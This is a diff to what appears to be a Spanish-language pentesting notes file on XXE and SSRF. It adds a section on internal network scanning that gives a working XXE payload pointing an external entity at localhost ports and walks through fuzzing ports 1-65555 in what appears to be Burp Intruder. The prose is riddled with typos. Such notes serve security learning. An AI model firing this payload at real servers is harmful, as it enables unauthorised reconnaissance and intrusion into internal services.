@@ -199,6 +199,34 @@ Explicación
 
 Server-Side Request Forgery (SSRF) Ocurre cuand oel atacante abusca funcionalidades del servidor, causando al servidor que haga ocnsultas en localizaciones no intencionadas. En el contexto de una XXE, el atacatne manipula input XML para hacer al servidor consultas que no son verdaderos en servicios internos. La técnica se usa para escanear reter internas, acceder a endporint o interactura con serivicos que son accesibles del servidor local
 
+## Escaneo de red interna
+
+```
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
+]>
+<contact>
+  <name>&xxe;</name>
+  <email>test@test.com</email>
+  <message>test</message>
+</contact>
+```
+
+Una vez capturemos la consulta añadiremos en el boton
+
+![image](https://github.com/user-attachments/assets/97bdccba-2258-47b0-bbeb-4e69b7f14c33)
+
+En la parte de payload añadiremos numeros de 1-65555
+
+![image](https://github.com/user-attachments/assets/7665ce4a-d51a-4d80-abcd-15e672c137be)
+
+Una vez tengamos esto podemos ir probando con diferentes leghts
+
+![image](https://github.com/user-attachments/assets/2be4c76a-cda3-40ce-9658-94ad14a07f50)
+
+
+
 
 
 
